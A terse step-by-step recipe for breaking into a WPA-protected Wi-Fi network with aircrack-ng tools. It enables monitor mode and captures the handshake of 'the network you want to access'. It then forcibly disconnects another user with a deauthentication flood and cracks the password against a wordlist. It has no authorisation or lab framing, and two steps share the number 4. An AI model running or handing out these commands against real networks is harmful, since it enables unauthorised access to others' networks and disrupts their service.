1. Start airmon-ng
airmon-ng start wlan0
2. Run airodump
airodump-ng -i mon0
3. Find the network you want to access
airodump-ng --bssid <bssid> -c 11 -w cowpatty mon0
wait for "WPA handshake: ##:##:##:##:##:##"
4. Kick someone else off
aireplay-ng --deauth 100 -a <bssid> mon0
4. Dictionary or other, crack the password
aircrack-ng WPAcrack.cap -w <wordlist>
